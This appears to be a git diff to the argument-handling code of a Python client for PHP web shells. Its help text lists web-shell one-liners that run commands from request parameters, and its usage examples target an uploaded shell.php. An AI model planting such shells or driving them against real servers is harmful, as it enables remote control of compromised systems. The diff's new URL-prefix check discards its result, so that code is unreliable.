@@ -33,7 +33,7 @@ class GetArgs(object):
 2-   <?php exec($_POST['parameter']); ?>
 3-   <?php passthru($_REQUEST['parameter']); ?>{end}
 
-run {red}{script} -h{end} for help'''.format(script=argv[0], hot=Colors.HOT, yellow=Colors.YELLOW, red=Colors.RED, end=Colors.END)
+Run: {red}{script} -h{end} for help'''.format(script=argv[0], hot=Colors.HOT, yellow=Colors.YELLOW, red=Colors.RED, end=Colors.END)
         exit(1)
     else:
         parser = argparse.ArgumentParser(
@@ -44,7 +44,7 @@ run {red}{script} -h{end} for help'''.format(script=argv[0], hot=Colors.HOT, yel
 Examples:
     python %(prog)s --url http://www.mywebsite.com/shell.php?cmd=
     python %(prog)s --url http://www.mywebsite.com/shell.php --method POST --parameter cmd
-    python %(prog)s -u http://www.mywebsite.com/shell.php?cmd= --random-agent
+    python %(prog)s -u http://www.mywebsite.com/shell.php?cmd= --random-agent --turbo
     python %(prog)s -u http://www.mywebsite.com/shell.php?cmd= --proxy http://127.0.0.1:8080''')
         positional = parser.add_argument_group('Positional arguments')
         positional.add_argument('-u', '--url', help='\t\tFull URL for the uploaded PHP code', metavar='')
@@ -58,7 +58,7 @@ Examples:
         optional.add_argument('-rg', '--random-agent', dest='random_agent', help='\t\tWebHandler will use some random user-agent', action='store_true')
         optional.add_argument('-up', '--update', dest='update', help='\t\tUpdate webhandler from git cli  "GitHub repo"', action='store_true')
         options = parser.parse_args()
-        url = options.url if options.url.startswith('http') else "http://" + options.url
+        url = options.url
         method = options.method.lower() if options.method else None
         parameter = options.parameter
         proxy = options.proxy
@@ -67,5 +67,12 @@ Examples:
         turbo = options.turbo
         update = options.update
 
+        # URL might not be set (e.g. if updating)
+        if options.url:
+            # Did they forget to add "http" infront?
+            if not options.url.startswith('http'):
+                "http://" + options.url
+
+                
 getargs = GetArgs()
 banner = Banner().banner
